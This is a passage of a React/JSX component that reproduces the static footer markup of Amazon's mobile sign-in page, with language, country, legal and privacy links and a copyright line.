                                                href="https://www.amazon.com/business/register/welcome?ref_=ab_reg_signin"
                                            >
                                                <span>
                                                    {' '}
                                                    Shop on Amazon Business{' '}
                                                </span>
                                            </a>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>

                <footer className="nav-mobile nav-ftr-batmobile">
                    <div
                        id="nav-ftr"
                        className="nav-t-footer-basicNoAuth nav-sprite-v3"
                    >
                        <div className="icp-container-mobile">
                            <a
                                href="/customer-preferences/edit?from=mobile&amp;ie=UTF8&amp;preferencesReturnUrl=%2Fap%2Fsignin&amp;ref_=footer_lang"
                                aria-label="Choose a language for shopping."
                                className="icp-touch-link-2"
                                id="icp-touch-link-language"
                            >
                                <div className="icp-nav-globe-img-2 icp-mobile-globe-2"></div>
                                <span className="icp-color-base">English</span>
                                <span className="nav-arrow icp-up-down-arrow"></span>
                            </a>

                            <a
                                href="/customer-preferences/country?ie=UTF8&amp;preferencesReturnUrl=%2Fap%2Fsignin&amp;ref_=navm_footer_icp_cp"
                                aria-label="Choose a country/region for shopping."
                                className="icp-touch-link-2"
                                id="icp-touch-link-country"
                            >
                                <span className="icp-flag-3 icp-flag-3-us"></span>
                                <span className="icp-color-base">
                                    United States
                                </span>
                            </a>
                        </div>

                        <ul className="nav-ftr-horiz">
                            <li className="nav-li">
                                <a
                                    href="/gp/help/customer/display.html?nodeId=508088&amp;ref_=navm_ftr_cou"
                                    id=""
                                    className="nav-a"
                                >
                                    Conditions of Use
                                </a>
                            </li>
                            <li className="nav-li">
                                <a
                                    href="/gp/help/customer/display.html?ie=UTF8&amp;nodeId=468496&amp;ref_=footer_privacy"
                                    id=""
                                    className="nav-a"
                                >
                                    Privacy Notice
                                </a>
                            </li>
                            <li className="nav-li">
                                <a
                                    href="/privacyprefs?ref_=footer_iba"
                                    id=""
                                    className="nav-a"
                                >
                                    Your Ads Privacy Choices
                                </a>
                            </li>
                            <li className="nav-li">
                                <span
                                    id="nav-icon-ccba"
                                    className="nav-sprite"
                                ></span>
                            </li>
                        </ul>

                        <div id="nav-ftr-copyright">
                            © 1996-2024, Amazon.com, Inc. or its affiliates
                        </div>
                        <div id="nav-ftr-legal"></div>
                    </div>
                </footer>
            </div>
        </div>
    );
}
